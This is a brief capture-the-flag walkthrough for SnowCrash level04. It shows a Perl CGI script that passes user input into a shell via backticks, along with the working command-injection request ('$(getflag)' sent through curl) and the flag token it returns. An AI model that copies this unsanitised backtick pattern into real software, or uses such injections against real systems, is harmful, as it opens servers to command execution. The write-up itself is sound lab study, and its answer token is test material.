# Level04

in the level04 there is a pearl file

```shell
level04@SnowCrash:~$ ls
level04.pl

```pearl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

this code creates a function x that take the input and print it with echo and then prints the result back to the browser

that's mean we can do echo the `getflag`

```shell
level04@SnowCrash:~$ curl 'localhost:4747?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```